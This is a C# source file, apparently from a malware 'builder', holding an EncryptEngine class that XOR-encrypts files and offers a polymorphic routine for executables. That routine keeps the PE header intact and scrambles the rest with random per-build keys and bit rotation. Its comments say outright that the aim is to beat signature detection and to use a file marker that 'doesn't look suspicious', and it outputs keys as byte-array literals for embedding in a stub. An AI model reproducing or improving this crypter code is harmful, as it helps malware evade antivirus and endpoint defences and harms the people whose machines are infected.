using System;
using System.IO;
using System.Linq;

namespace Builder.ModulesBuilder
{
    internal class EncryptEngine
    {
        public static void EncryptFileAndSave(string filePath, byte[] xorKey, string outputFilePath)
        {
            byte[] fileBytes = File.ReadAllBytes(filePath);
            byte[] encryptedBytes = new byte[fileBytes.Length];

            for (int i = 0; i < fileBytes.Length; i++)
            {
                encryptedBytes[i] = (byte)(fileBytes[i] ^ xorKey[i % xorKey.Length]);
            }

            File.WriteAllBytes(outputFilePath, encryptedBytes);
        }

        public static void EncryptFilePolymorphic(string filePath, byte[] xorKey, string outputFilePath)
        {
            byte[] fileBytes = File.ReadAllBytes(filePath);
            
            // Detect if this is a PE file (executable)
            bool isPEFile = fileBytes.Length > 2 && fileBytes[0] == 'M' && fileBytes[1] == 'Z';
            
            // Custom encryption for all files, with special handling for PE files
            // We'll create a unique multi-layered encryption approach
            
            // Generate a set of dynamic encryption keys based on the file content itself
            // This creates a unique encryption pattern for each file
            byte[] contentBasedKey = GenerateContentBasedKey(fileBytes, xorKey);
            byte[] dynamicKey = GenerateRandomBytes(32);
            
            // Encryption metadata
            byte[] metadataKey = GenerateRandomBytes(16); // Used to encrypt our metadata
            
            // Create metadata for our encryption (will be encrypted itself)
            byte[] metadata = new byte[64];
            Random random = new Random();
            
            // Set some random values for key transformation
            int blockSize = random.Next(32, 256);
            int skipPattern = random.Next(4, 16);
            int shiftValue = random.Next(1, 7);
            
            // Store these values in metadata
            Buffer.BlockCopy(BitConverter.GetBytes(blockSize), 0, metadata, 0, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(skipPattern), 0, metadata, 4, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(shiftValue), 0, metadata, 8, 4);
            Buffer.BlockCopy(dynamicKey, 0, metadata, 16, Math.Min(32, dynamicKey.Length));
            
            // Encrypt the metadata with metadataKey
            byte[] encryptedMetadata = EncryptMetadata(metadata, metadataKey);
            
            // Final file structure:
            // [4 bytes - magic marker]
            // [16 bytes - metadataKey]
            // [4 bytes - encrypted metadata length]
            // [N bytes - encrypted metadata]
            // [X bytes - encrypted file content]
            
            // Prepare the encrypted content
            byte[] encryptedContent;
            
            if (isPEFile)
            {
                // For PE files, we'll use a specialized layered approach that preserves PE header structure
                // This helps maintain functionality while still obfuscating the content
                encryptedContent = EncryptPEFile(fileBytes, contentBasedKey, dynamicKey, blockSize, skipPattern, shiftValue);
            }
            else
            {
                // For non-PE files, use a different approach with more aggressive encryption
                encryptedContent = EncryptStandardFile(fileBytes, contentBasedKey, dynamicKey, blockSize, skipPattern, shiftValue);
            }
            
            // Create the final encrypted file
            using (MemoryStream ms = new MemoryStream())
            using (BinaryWriter writer = new BinaryWriter(ms))
            {
                // Custom magic marker that doesn't look suspicious (looks like a legitimate header value)
                writer.Write(new byte[] { 0x4E, 0x56, 0x52, 0x54 }); // "NVRT" - doesn't indicate encryption
                
                // Write the metadata key
                writer.Write(metadataKey);
                
                // Write the encrypted metadata length and data
                writer.Write(encryptedMetadata.Length);
                writer.Write(encryptedMetadata);
                
                // Write the encrypted content
                writer.Write(encryptedContent);
                
                // Save the final encrypted file
                File.WriteAllBytes(outputFilePath, ms.ToArray());
            }
        }

        // Generates a content-based key that varies based on the file content itself
        private static byte[] GenerateContentBasedKey(byte[] content, byte[] seedKey)
        {
            // Create a key that's derived from the content itself, making each encryption unique
            byte[] contentKey = new byte[32];
            
            // Initialize with seed key
            for (int i = 0; i < contentKey.Length; i++)
            {
                contentKey[i] = seedKey[i % seedKey.Length];
            }
            
            // Mix in content characteristics
            if (content.Length > 0)
            {
                for (int i = 0; i < contentKey.Length; i++)
                {
                    // Sample different parts of the content to influence the key
                    int samplePos = (i * 251) % content.Length; // Use prime number to get good distribution
                    contentKey[i] ^= content[samplePos];
                    
                    // Add some non-linear transformations to make prediction harder
                    contentKey[i] = (byte)((contentKey[i] << 3) | (contentKey[i] >> 5));
                    
                    // Mix with previous value for avalanche effect
                    if (i > 0)
                        contentKey[i] ^= contentKey[i - 1];
                }
            }
            
            return contentKey;
        }

        // Encrypts the PE file while preserving its structure
        private static byte[] EncryptPEFile(byte[] fileBytes, byte[] contentKey, byte[] dynamicKey, int blockSize, int skipPattern, int shiftValue)
        {
            byte[] result = new byte[fileBytes.Length];
            Buffer.BlockCopy(fileBytes, 0, result, 0, fileBytes.Length);
            
            // Always preserve the first 256 bytes (MZ header and PE header)
            // This is crucial for PE file integrity
            int startOffset = 256;
            
            // Use a multi-layered approach to encrypt the content
            for (int i = startOffset; i < result.Length; i++)
            {
                // First layer: Dynamic block-based XOR with content-derived key
                int blockIndex = (i / blockSize) % 4;
                byte blockKey = contentKey[(i % contentKey.Length) ^ blockIndex];
                
                // Second layer: Selective encryption with skip pattern
                if (i % skipPattern != 0) // Skip some bytes to create polymorphic pattern
                {
                    // Apply XOR with the dynamic key
                    byte dynamicXorKey = dynamicKey[i % dynamicKey.Length];
                    result[i] ^= dynamicXorKey;
                    
                    // Apply bit rotation - very effective against signature detection
                    result[i] = (byte)((result[i] << shiftValue) | (result[i] >> (8 - shiftValue)));
                    
                    // Apply final XOR with the block key
                    result[i] ^= blockKey;
                }
                
                // For the skipped bytes, apply a different transformation
                // This makes the encryption pattern irregular and harder to detect
                else
                {
                    // Simple byte substitution
                    result[i] = (byte)(result[i] ^ (byte)(i & 0xFF));
                }
            }
            
            return result;
        }

        // Encrypts standard (non-PE) files with a more aggressive approach
        private static byte[] EncryptStandardFile(byte[] fileBytes, byte[] contentKey, byte[] dynamicKey, int blockSize, int skipPattern, int shiftValue)
        {
            byte[] result = new byte[fileBytes.Length];
            
            // For standard files, we can encrypt everything without preserving structure
            for (int i = 0; i < fileBytes.Length; i++)
            {
                // Determine which encryption layer to use based on position
                int layerType = (i / blockSize) % 3;
                
                switch (layerType)
                {
                    case 0:
                        // Layer 1: XOR with content key
                        result[i] = (byte)(fileBytes[i] ^ contentKey[i % contentKey.Length]);
                        break;
                        
                    case 1:
                        // Layer 2: XOR with dynamic key + bit rotation
                        result[i] = (byte)(fileBytes[i] ^ dynamicKey[i % dynamicKey.Length]);
                        result[i] = (byte)((result[i] << shiftValue) | (result[i] >> (8 - shiftValue)));
                        break;
                        
                    case 2:
                        // Layer 3: Complex multi-key operation
                        byte mixedKey = (byte)(contentKey[i % contentKey.Length] ^ dynamicKey[(i * 3) % dynamicKey.Length]);
                        result[i] = (byte)(fileBytes[i] ^ mixedKey);
                        // Add a substitution layer with a simple s-box concept
                        result[i] = (byte)((result[i] + 7) ^ 0xA5);
                        break;
                }
            }
            
            return result;
        }

        // Encrypt the metadata with its own key
        private static byte[] EncryptMetadata(byte[] metadata, byte[] metadataKey)
        {
            byte[] result = new byte[metadata.Length];
            
            for (int i = 0; i < metadata.Length; i++)
            {
                // Use a unique encryption method for metadata that doesn't resemble the main encryption
                byte keyByte = metadataKey[i % metadataKey.Length];
                byte transformedKey = (byte)((keyByte << 2) | (keyByte >> 6));
                
                // Apply a reversible but complex transformation
                result[i] = (byte)((metadata[i] + transformedKey) & 0xFF);
            }
            
            return result;
        }

        public static string GenerateHexArray(byte[] data)
        {
            return "new byte[] { " + string.Join(", ", data.Select(b => "0x" + b.ToString("X2"))) + " };";
        }

        public static byte[] GenerateRandomBytes(int length)
        {
            Random random = new Random();
            byte[] bytes = new byte[length];
            random.NextBytes(bytes);
            return bytes;
        }

        public static string GenerateRandomStr(int length)
        {
            var random = new Random();
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }
}